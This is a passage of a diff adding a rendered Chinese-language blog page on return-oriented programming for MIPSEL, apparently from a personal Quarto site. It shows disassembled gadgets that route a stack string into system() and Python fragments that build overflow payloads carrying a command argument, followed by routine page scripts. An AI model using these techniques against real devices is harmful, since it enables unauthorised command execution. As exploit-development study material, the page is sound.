+<h2 class="anchored" data-anchor-id="arch-mipsel">arch = mipsel</h2>
+<section id="无截断-rop-1" class="level3">
+<h3 class="anchored" data-anchor-id="无截断-rop-1">无截断 ROP</h3>
+<p>以下为原笔记中常用的 gadget 形式。</p>
+<section id="将栈地址传入-a0" class="level4">
+<h4 class="anchored" data-anchor-id="将栈地址传入-a0">将栈地址传入 $a0</h4>
+<p>寻找 <code>$a0</code> 指向栈上数据、通过 <code>jalr $t9</code> 调用 <code>system</code> 的片段。</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>MIPSEL · 栈地址作为 system 参数</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb8" data-filename="MIPSEL · 栈地址作为 system 参数"><pre class="sourceCode asm code-with-copy"><code class="sourceCode fasm"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043AD28    addiu   <span class="op">$</span>v0<span class="op">,</span> <span class="op">$</span>sp<span class="op">,</span> <span class="bn">0xCC</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043AD2C    move    <span class="op">$</span>a0<span class="op">,</span> <span class="op">$</span>v0</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043AD30    la      <span class="op">$</span>v0<span class="op">,</span> system</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043AD34    <span class="bu">nop</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043AD38    move    <span class="op">$</span>t9<span class="op">,</span> <span class="op">$</span>v0</span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043AD3C    jalr    <span class="op">$</span>t9  <span class="co">; system</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043AD40    <span class="bu">nop</span></span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+<p>Payload 中，命令放在 gadget 之后的对应栈偏移处：</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>MIPSEL · 栈上命令 payload 片段</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb9" data-filename="MIPSEL · 栈上命令 payload 片段"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">'a'</span> <span class="op">*</span> pad</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> gadget</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'a'</span> <span class="op">*</span> <span class="bn">0xcc</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> command</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'</span><span class="ch">\x00</span><span class="st">'</span></span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</section>
+<section id="组合-gadget" class="level4">
+<h4 class="anchored" data-anchor-id="组合-gadget">组合 gadget</h4>
+<p>若没有找到直接将栈地址传入 <code>$a0</code> 并调用 <code>system</code> 的 gadget，原笔记使用以下组合：</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>MIPSEL · 函数返回与组合 gadget</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb10" data-filename="MIPSEL · 函数返回与组合 gadget"><pre class="sourceCode asm code-with-copy"><code class="sourceCode fasm"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co">; func return</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D3EC    lw      <span class="op">$</span>ra<span class="op">,</span> <span class="bn">0x80</span><span class="op">+</span>var_s1C<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D3F0    lw      <span class="op">$</span>s6<span class="op">,</span> <span class="bn">0x80</span><span class="op">+</span>var_s18<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D3F4    lw      <span class="op">$</span>s5<span class="op">,</span> <span class="bn">0x80</span><span class="op">+</span>var_s14<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D3F8    lw      <span class="op">$</span>s4<span class="op">,</span> <span class="bn">0x80</span><span class="op">+</span>var_s10<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D3FC    lw      <span class="op">$</span>s3<span class="op">,</span> <span class="bn">0x80</span><span class="op">+</span>var_sC<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D400    lw      <span class="op">$</span>s2<span class="op">,</span> <span class="bn">0x80</span><span class="op">+</span>var_s8<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D404    lw      <span class="op">$</span>s1<span class="op">,</span> <span class="bn">0x80</span><span class="op">+</span>var_s4<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D408    lw      <span class="op">$</span>s0<span class="op">,</span> <span class="bn">0x80</span><span class="op">+</span>var_s0<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D40C    jr      <span class="op">$</span>ra</span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041D410    addiu   <span class="op">$</span>sp<span class="op">,</span> <span class="bn">0xA0</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="co">; rop0</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBA8    la      <span class="op">$</span>t9<span class="op">,</span> system</span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBAC    <span class="bu">nop</span></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBB0    jalr    <span class="op">$</span>t9  <span class="co">; system</span></span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBB4    move    <span class="op">$</span>a0<span class="op">,</span> <span class="op">$</span>s0  <span class="op">#</span> command</span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBB8    lw      <span class="op">$</span>gp<span class="op">,</span> <span class="bn">0xA0</span><span class="op">+</span>var_90<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBBC    lw      <span class="op">$</span>ra<span class="op">,</span> <span class="bn">0xA0</span><span class="op">+</span>var_s8<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBC0    lw      <span class="op">$</span>s1<span class="op">,</span> <span class="bn">0xA0</span><span class="op">+</span>var_s4<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBC4    lw      <span class="op">$</span>s0<span class="op">,</span> <span class="bn">0xA0</span><span class="op">+</span>var_s0<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBC8    move    <span class="op">$</span>v0<span class="op">,</span> <span class="op">$</span>zero</span>
+<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBCC    jr      <span class="op">$</span>ra</span>
+<span id="cb10-24"><a href="#cb10-24" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0043DBD0    addiu   <span class="op">$</span>sp<span class="op">,</span> <span class="bn">0xB0</span></span>
+<span id="cb10-25"><a href="#cb10-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-26"><a href="#cb10-26" aria-hidden="true" tabindex="-1"></a><span class="co">; rop1</span></span>
+<span id="cb10-27"><a href="#cb10-27" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041A4EC    jalr    <span class="op">$</span>t9</span>
+<span id="cb10-28"><a href="#cb10-28" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0041A4F0    addiu   <span class="op">$</span>a0<span class="op">,</span> <span class="op">$</span>sp<span class="op">,</span> <span class="bn">0x38</span><span class="op">+</span>var_1F  <span class="op">#</span> s</span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+<p>对应的 payload 片段：</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>MIPSEL · 组合 gadget 的 payload</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb11" data-filename="MIPSEL · 组合 gadget 的 payload"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"</span><span class="ch">\x00</span><span class="st">"</span> <span class="op">*</span> <span class="dv">4</span>             <span class="co"># s0</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"B"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># s1</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"C"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># s2</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"D"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># s3</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"E"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># s4</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"F"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># s5</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"G"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># s6</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> rop_gadget[<span class="dv">0</span>]          <span class="co"># ra: 0x43DBA8</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"H"</span> <span class="op">*</span> <span class="bn">0x10</span>             <span class="co"># Padding</span></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"I"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># gp</span></span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"J"</span> <span class="op">*</span> <span class="bn">0x8C</span>             <span class="co"># Padding</span></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"K"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># s0</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"L"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># s1</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> rop_gadget[<span class="dv">1</span>]          <span class="co"># ra: 0x41A4EC</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"M"</span> <span class="op">*</span> <span class="bn">0x4</span>              <span class="co"># Padding</span></span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"N"</span> <span class="op">*</span> <span class="bn">0x19</span>             <span class="co"># Padding</span></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> args.command <span class="op">+</span> <span class="st">"</span><span class="ch">\x00</span><span class="st">"</span>  <span class="co"># Add the command and then NULL-terminate it</span></span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>data <span class="op">+=</span> <span class="st">"Z"</span> <span class="op">*</span> <span class="bn">0x1000</span>           <span class="co"># Pad out the payload (it needs to be at least a certain size)</span></span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</section>
+<section id="从栈中读取指针再传入-a0" class="level4">
+<h4 class="anchored" data-anchor-id="从栈中读取指针再传入-a0">从栈中读取指针，再传入 $a0</h4>
+<p>寻找将栈中内容加载到 <code>$v0</code>，随后传入 <code>$a0</code> 并调用 <code>system</code> 的片段。原笔记中，<code>0x2C+var_8($sp)</code> 存放的内容是一个指针（多数为栈地址），其指向的位置可以存放 <code>command</code>。</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>MIPSEL · 从栈中读取参数指针</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb12" data-filename="MIPSEL · 从栈中读取参数指针"><pre class="sourceCode asm code-with-copy"><code class="sourceCode fasm"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>004058F8    lw      <span class="op">$</span>v0<span class="op">,</span> <span class="bn">0x2C</span><span class="op">+</span>var_8<span class="op">($</span>sp<span class="op">)</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>004058FC    <span class="bu">nop</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00405900    move    <span class="op">$</span>a0<span class="op">,</span> <span class="op">$</span>v0</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00405904    la      <span class="op">$</span>v0<span class="op">,</span> system</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00405908    <span class="bu">nop</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0040590C    move    <span class="op">$</span>t9<span class="op">,</span> <span class="op">$</span>v0</span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00405910    jalr    <span class="op">$</span>t9  <span class="co">; system</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00405914    <span class="bu">nop</span></span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</section>
+</section>
+<section id="有截断-rop-1" class="level3">
+<h3 class="anchored" data-anchor-id="有截断-rop-1">有截断 ROP</h3>
+<p>原笔记中的总体思路与 ARMEL 部分相同。</p>
+<p><a href="../../blogs.html">← 返回 Blogs</a></p>
+
+
+</section>
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+  window.document.addEventListener("DOMContentLoaded", function (event) {
+    const icon = "";
+    const anchorJS = new window.AnchorJS();
+    anchorJS.options = {
+      placement: 'right',
+      icon: icon
+    };
+    anchorJS.add('.anchored');
+    const isCodeAnnotation = (el) => {
+      for (const clz of el.classList) {
+        if (clz.startsWith('code-annotation-')) {                     
+          return true;
+        }
+      }
+      return false;
+    }
+    const onCopySuccess = function(e) {
+      // button target
+      const button = e.trigger;
+      // don't keep focus
+      button.blur();
+      // flash "checked"
+      button.classList.add('code-copy-button-checked');
+      var currentTitle = button.getAttribute("title");
+      button.setAttribute("title", "已复制");
+      let tooltip;
+      if (window.bootstrap) {
+        button.setAttribute("data-bs-toggle", "tooltip");
+        button.setAttribute("data-bs-placement", "left");
+        button.setAttribute("data-bs-title", "已复制");
+        tooltip = new bootstrap.Tooltip(button, 
+          { trigger: "manual", 
+            customClass: "code-copy-button-tooltip",
+            offset: [0, -8]});
+        tooltip.show();    
+      }
+      setTimeout(function() {
+        if (tooltip) {
+          tooltip.hide();
+          button.removeAttribute("data-bs-title");
+          button.removeAttribute("data-bs-toggle");
+          button.removeAttribute("data-bs-placement");
+        }
+        button.setAttribute("title", currentTitle);
+        button.classList.remove('code-copy-button-checked');
+      }, 1000);
+      // clear code selection
+      e.clearSelection();
+    }
+    const getTextToCopy = function(trigger) {
+      const outerScaffold = trigger.parentElement.cloneNode(true);
+      const codeEl = outerScaffold.querySelector('code');
+      for (const childEl of codeEl.children) {
+        if (isCodeAnnotation(childEl)) {
+          childEl.remove();
+        }
+      }
+      return codeEl.innerText;
+    }
+    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+      text: getTextToCopy
+    });
+    clipboard.on('success', onCopySuccess);
+    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+        text: getTextToCopy,
+        container: window.document.getElementById('quarto-embedded-source-code-modal')
+      });
+      clipboardModal.on('success', onCopySuccess);
+    }
+      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+      var mailtoRegex = new RegExp(/^mailto:/);
+        var filterRegex = new RegExp("https:\/\/yangshuangning\.github\.io");
+      var isInternal = (href) => {
+          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+      }
+      // Inspect non-navigation links and adorn them if external
+     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+      for (var i=0; i<links.length; i++) {
+        const link = links[i];
+        if (!isInternal(link.href)) {
+          // undo the damage that might have been done by quarto-nav.js in the case of
+          // links that we want to consider external
+          if (link.dataset.originalHref !== undefined) {
+            link.href = link.dataset.originalHref;
+          }
+        }
+      }
+    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+      const config = {
+        allowHTML: true,
+        maxWidth: 500,
+        delay: 100,
+        arrow: false,
+        appendTo: function(el) {
+            return el.parentElement;
+        },
+        interactive: true,
+        interactiveBorder: 10,
+        theme: 'quarto',
+        placement: 'bottom-start',
+      };
+      if (contentFn) {
+        config.content = contentFn;
+      }
+      if (onTriggerFn) {
+        config.onTrigger = onTriggerFn;
+      }
+      if (onUntriggerFn) {
+        config.onUntrigger = onUntriggerFn;
+      }
+      window.tippy(el, config); 
+    }
+    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+    for (var i=0; i<noterefs.length; i++) {
+      const ref = noterefs[i];
+      tippyHover(ref, function() {
+        // use id or data attribute instead here
+        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+        try { href = new URL(href).hash; } catch {}
+        const id = href.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note) {
+          return note.innerHTML;
+        } else {
+          return "";
+        }
+      });
+    }
+    const xrefs = window.document.querySelectorAll('a.quarto-xref');
+    const processXRef = (id, note) => {
+      // Strip column container classes
+      const stripColumnClz = (el) => {
+        el.classList.remove("page-full", "page-columns");
+        if (el.children) {
+          for (const child of el.children) {
+            stripColumnClz(child);
+          }
+        }
+      }
+      stripColumnClz(note)
+      if (id === null || id.startsWith('sec-')) {
+        // Special case sections, only their first couple elements
+        const container = document.createElement("div");
+        if (note.children && note.children.length > 2) {
+          container.appendChild(note.children[0].cloneNode(true));
+          for (let i = 1; i < note.children.length; i++) {
+            const child = note.children[i];
+            if (child.tagName === "P" && child.innerText === "") {
+              continue;
+            } else {
+              container.appendChild(child.cloneNode(true));
+              break;
+            }
+          }
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(container);
+          }
+          return container.innerHTML
+        } else {
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(note);
+          }
+          return note.innerHTML;
+        }
+      } else {
+        // Remove any anchor links if they are present
+        const anchorLink = note.querySelector('a.anchorjs-link');
+        if (anchorLink) {
+          anchorLink.remove();
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        if (note.classList.contains("callout")) {
+          return note.outerHTML;
+        } else {
+          return note.innerHTML;
+        }
+      }
+    }
+    for (var i=0; i<xrefs.length; i++) {
+      const xref = xrefs[i];
+      tippyHover(xref, undefined, function(instance) {
+        instance.disable();
+        let url = xref.getAttribute('href');
+        let hash = undefined; 
+        if (url.startsWith('#')) {
+          hash = url;
+        } else {
+          try { hash = new URL(url).hash; } catch {}
+        }
+        if (hash) {
+          const id = hash.replace(/^#\/?/, "");
+          const note = window.document.getElementById(id);
+          if (note !== null) {
+            try {
+              const html = processXRef(id, note.cloneNode(true));
+              instance.setContent(html);
+            } finally {
+              instance.enable();
+              instance.show();
+            }
+          } else {
+            // See if we can fetch this
+            fetch(url.split('#')[0])
+            .then(res => res.text())
+            .then(html => {
+              const parser = new DOMParser();
+              const htmlDoc = parser.parseFromString(html, "text/html");
+              const note = htmlDoc.getElementById(id);
+              if (note !== null) {
+                const html = processXRef(id, note);
+                instance.setContent(html);
+              } 
+            }).finally(() => {
+              instance.enable();
+              instance.show();
+            });
+          }
+        } else {
+          // See if we can fetch a full url (with no hash to target)
+          // This is a special case and we should probably do some content thinning / targeting
+          fetch(url)
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.querySelector('main.content');
+            if (note !== null) {
+              // This should only happen for chapter cross references
+              // (since there is no id in the URL)
+              // remove the first header
+              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+                note.children[0].remove();
+              }
+              const html = processXRef(null, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      }, function(instance) {
+      });
+    }
+        let selectedAnnoteEl;
+        const selectorForAnnotation = ( cell, annotation) => {
+          let cellAttr = 'data-code-cell="' + cell + '"';
+          let lineAttr = 'data-code-annotation="' +  annotation + '"';
+          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+          return selector;
+        }
+        const selectCodeLines = (annoteEl) => {
+          const doc = window.document;
+          const targetCell = annoteEl.getAttribute("data-target-cell");
+          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+          const lineIds = lines.map((line) => {
+            return targetCell + "-" + line;
+          })
+          let top = null;
+          let height = null;
+          let parent = null;
+          if (lineIds.length > 0) {
+              //compute the position of the single el (top and bottom and make a div)
+              const el = window.document.getElementById(lineIds[0]);
+              top = el.offsetTop;
+              height = el.offsetHeight;
+              parent = el.parentElement.parentElement;
+            if (lineIds.length > 1) {
+              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+              height = bottom - top;
+            }
+            if (top !== null && height !== null && parent !== null) {
+              // cook up a div (if necessary) and position it 
+              let div = window.document.getElementById("code-annotation-line-highlight");
+              if (div === null) {
+                div = window.document.createElement("div");
+                div.setAttribute("id", "code-annotation-line-highlight");
+                div.style.position = 'absolute';
+                parent.appendChild(div);
+              }
+              div.style.top = top - 2 + "px";
+              div.style.height = height + 4 + "px";
+              div.style.left = 0;
+              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+              if (gutterDiv === null) {
+                gutterDiv = window.document.createElement("div");
+                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+                gutterDiv.style.position = 'absolute';
+                const codeCell = window.document.getElementById(targetCell);
+                const gutter = codeCell.querySelector('.code-annotation-gutter');
+                gutter.appendChild(gutterDiv);
+              }
+              gutterDiv.style.top = top - 2 + "px";
+              gutterDiv.style.height = height + 4 + "px";
+            }
+            selectedAnnoteEl = annoteEl;
+          }
+        };
+        const unselectCodeLines = () => {
+          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+          elementsIds.forEach((elId) => {
+            const div = window.document.getElementById(elId);
+            if (div) {
+              div.remove();
+            }
+          });
+          selectedAnnoteEl = undefined;
+        };
+          // Handle positioning of the toggle
+      window.addEventListener(
+        "resize",
+        throttle(() => {
+          elRect = undefined;
+          if (selectedAnnoteEl) {
+            selectCodeLines(selectedAnnoteEl);
+          }
+        }, 10)
+      );
+      function throttle(fn, ms) {
+      let throttle = false;
+      let timer;
+        return (...args) => {
+          if(!throttle) { // first call gets through
+              fn.apply(this, args);
+              throttle = true;
+          } else { // all the others get throttled
+              if(timer) clearTimeout(timer); // cancel #2
+              timer = setTimeout(() => {
+                fn.apply(this, args);
+                timer = throttle = false;
+              }, ms);
+          }
+        };
+      }
+        // Attach click handler to the DT
+        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+        for (const annoteDlNode of annoteDls) {
+          annoteDlNode.addEventListener('click', (event) => {
+            const clickedEl = event.target;
+            if (clickedEl !== selectedAnnoteEl) {
+              unselectCodeLines();
+              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+              if (activeEl) {
+                activeEl.classList.remove('code-annotation-active');
+              }
+              selectCodeLines(clickedEl);
+              clickedEl.classList.add('code-annotation-active');
+            } else {
+              // Unselect the line
+              unselectCodeLines();
+              clickedEl.classList.remove('code-annotation-active');
+            }
+          });
+        }
+    const findCites = (el) => {
+      const parentEl = el.parentElement;
+      if (parentEl) {
+        const cites = parentEl.dataset.cites;
+        if (cites) {
+          return {
+            el,
+            cites: cites.split(' ')
+          };
+        } else {
+          return findCites(el.parentElement)
+        }
+      } else {
+        return undefined;
+      }
+    };
+    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+    for (var i=0; i<bibliorefs.length; i++) {
+      const ref = bibliorefs[i];
+      const citeInfo = findCites(ref);
+      if (citeInfo) {
+        tippyHover(citeInfo.el, function() {
+          var popup = window.document.createElement('div');
+          citeInfo.cites.forEach(function(cite) {
+            var citeDiv = window.document.createElement('div');
+            citeDiv.classList.add('hanging-indent');
+            citeDiv.classList.add('csl-entry');
+            var biblioDiv = window.document.getElementById('ref-' + cite);
+            if (biblioDiv) {
+              citeDiv.innerHTML = biblioDiv.innerHTML;
+            }
+            popup.appendChild(citeDiv);
+          });
+          return popup.innerHTML;
+        });
+      }
+    }
+  });
+  </script>
+</div> <!-- /content -->
+<footer class="footer">
+  <div class="nav-footer">
+    <div class="nav-footer-left">
+      &nbsp;
+    </div>   
+    <div class="nav-footer-center">
+      &nbsp;
+    <div class="toc-actions d-sm-block d-md-none"><ul><li><a href="https://github.com/yangshuangning/yangshuangning.github.io/edit/main/posts/arm-mips-rop/index.qmd" class="toc-action"><i class="bi bi-github"></i>编辑该页面</a></li><li><a href="https://github.com/yangshuangning/yangshuangning.github.io/issues/new" class="toc-action"><i class="bi empty"></i>反馈问题</a></li></ul></div></div>
+    <div class="nav-footer-right">
+<p>Made with <a href="https://quarto.org/">Quarto</a><br></p>
+</div>
+  </div>
+</footer>
+
+
+
+
+</body></html>
